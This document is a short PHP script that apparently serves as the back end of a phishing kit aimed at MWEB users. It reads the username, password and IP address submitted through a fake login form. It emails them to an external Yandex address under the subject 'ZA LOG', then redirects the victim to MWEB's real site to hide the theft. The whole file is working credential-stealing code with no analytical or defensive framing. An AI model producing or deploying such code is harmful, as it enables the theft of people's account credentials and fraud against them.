<?

$ip = getenv("REMOTE_ADDR");
$message .= "----------------------Academico Result--------------------------\n";
$message .= "User: ".$_POST['user_id']."\n";
$message .= "Pass: ".$_POST['passwd']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Powered By SLM-------------------------\n";

$recipient = "dstones1@yandex.com";
$subject = "ZA LOG - $ip";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("", "Academico Logs", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://www.mweb.co.za/about-us");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>


